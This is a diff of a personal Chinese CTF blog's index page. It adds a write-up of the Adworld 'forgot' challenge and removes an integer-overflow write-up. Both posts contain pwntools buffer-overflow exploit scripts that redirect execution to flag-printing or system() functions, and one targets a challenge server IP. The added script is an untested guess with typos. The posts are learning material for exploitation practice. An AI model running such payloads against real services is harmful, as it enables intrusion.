@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">158</span>
+          <span class="site-state-item-count">159</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -152,6 +152,88 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/11/AD-forgot/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="一个废物捏">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="要roll就来！要roll就来！">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/11/AD-forgot/" class="post-title-link" itemprop="url">AD_forgot</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-04-11 17:46:36" itemprop="dateCreated datePublished" datetime="2021-04-11T17:46:36+08:00">2021-04-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-04-19 23:03:29" itemprop="dateModified" datetime="2021-04-19T23:03:29+08:00">2021-04-19</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><code>RELRO:    Partial RELRO</code> <code>Stack:    No canary found</code> <code>NX:       NX enabled</code> <code>PIE:      No PIE (0x8048000)</code></p>
+<p>目前所学所有攻击手法均需要有输入漏洞 本题有两个入口 第二个入口可产生数据溢出 <code>char v2[32]; // [esp+10h] [ebp-74h]</code> <code>__isoc99_scanf("%s", v2);</code> v2真正大小只有：32个字节，即ebp-74到ebp-54</p>
+<p>在从后往前分析一下：</p>
+<p>找到一个system函数可用，但没有关键字符串可用，或许可以自己构造</p>
+<p>又找到一个函数，几乎可以确定为目标函数 int sub_80486CC() { ​ char s; // [esp+1Eh] [ebp-3Ah] ​ snprintf(&amp;s, 0x32u, "cat %s", "./flag"); ​ return system(&amp;s); } 目标函数首地址为：0x080486CC</p>
+<p>找到一个反编译失败函数，地址：0x8048A61</p>
+<img src="/2021/04/11/AD-forgot/1.png" class>
+<p><code>(*(&amp;v3 + --v14))();</code></p>
+<p>取v3函数的地址，对其进行偏移，得到一个新的地址，调用这个函数</p>
+<p>第一想法是用这里直接TM的偏移到目标函数，试一试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">&quot;a&quot;</span>+p32(-<span class="number">238</span>)+p32(<span class="number">0x80486CC</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interative()</span><br><span class="line"><span class="comment"># 骗分过样例，暴力出奇迹</span></span><br></pre></td></tr></table></figure>
+<p>但是攻防世界网站又炸了，我是它爹</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1302,128 +1384,6 @@ p16()----2个字节</p>
 <p>在32位程序运行中，函数参数直接压入栈中。 调用函数时栈的结构为：1调用<strong>函数地址</strong>，2调用<strong>函数返回地址</strong>，参数n，参数n-1，参数。。。</p>
 <p>用0x88个字符覆盖栈，在用0x04个字符覆盖ebp的地址，将返回地址覆写为system函数。 根据调用函数时栈的结构，system函数需要返回地址，故写入0x04个字符作为虚假的返回地址（不起作用），在写入bin_sh命令作为system的参数。 关键在于，弄清system函数的底层结构。</p>
 <img src="/2021/03/14/AD-level2/1.jpg" class>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/10/AD-int-overflow/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="一个废物捏">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="要roll就来！要roll就来！">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/03/10/AD-int-overflow/" class="post-title-link" itemprop="url">AD_int_overflow</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-03-10 13:48:26" itemprop="dateCreated datePublished" datetime="2021-03-10T13:48:26+08:00">2021-03-10</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-03-14 12:52:39" itemprop="dateModified" datetime="2021-03-14T12:52:39+08:00">2021-03-14</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="溢出距离">溢出距离</h2>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">类型</th>
-<th style="text-align: center;">占用字节数</th>
-<th style="text-align: center;">取值范围</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">int</td>
-<td style="text-align: center;">4</td>
-<td style="text-align: center;">-2147483648~2147483647</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">short int</td>
-<td style="text-align: center;">2</td>
-<td style="text-align: center;">-32768~32767</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">unsigned int</td>
-<td style="text-align: center;">4</td>
-<td style="text-align: center;">0~4294967295</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">unsigned short int</td>
-<td style="text-align: center;">2</td>
-<td style="text-align: center;">0~65535</td>
-</tr>
-</tbody>
-</table>
-<p>65535D=0000 <strong>1111 1111 1111 1111</strong>B</p>
-<p>65536D=0001 <strong>0000 0000 0000 0000</strong>B</p>
-<p>65537D=0001 <strong>0000 0000 0000 0001</strong>B</p>
-<p>在一个unsigned short int 类型的变量中，由于溢出部分直接忽略（加粗部分为有效值），故65536D=0D，65537D=1D</p>
-<h2 id="题目中的溢出">题目中的溢出</h2>
-<img src="/2021/03/10/AD-int-overflow/1.png" class>
-<p>得出&amp;buf能存储409个字符</p>
-<img src="/2021/03/10/AD-int-overflow/2.png" class>
-<p>&amp;buf的参数传递给s</p>
-<p>v3用于存储s的长度</p>
-<p>unsigned _ int8 v3;代表v3的大小为8位，即能存储的数字范围为0到255，256相当于0，257相当于1。</p>
-<p>也就是说，如果s字符串的长度在259到264之间，也能通过if。</p>
-<h2 id="覆盖">覆盖</h2>
-<img src="/2021/03/10/AD-int-overflow/3.png" class>
-<img src="/2021/03/10/AD-int-overflow/4.png" class>
-<p>这里涉及字符串拷贝，拷贝的目的地在栈中，栈长度为14h+4h</p>
-<p>只要通过溢出覆盖check-passwd函数的返回地址，返回到what is this函数去执行里面的代码，就可以得到我们需要的flag</p>
-<p>第一步 4h+4h=20D+4D=24 覆盖掉用于拷贝的栈24个字节 第二步 跳转到what is this的地址 p32（0x0804868B） p32大小为4个字节，至此已输入了28个字节 第三步 补充字节直到密码长度为259到264之间</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47792</span>)</span><br><span class="line">flag = <span class="number">0x0804868B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;your father&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">24</span> + p32(flag) + <span class="string">&quot;a&quot;</span>*<span class="number">232</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>完结撒花</p>
 
       
     </div>
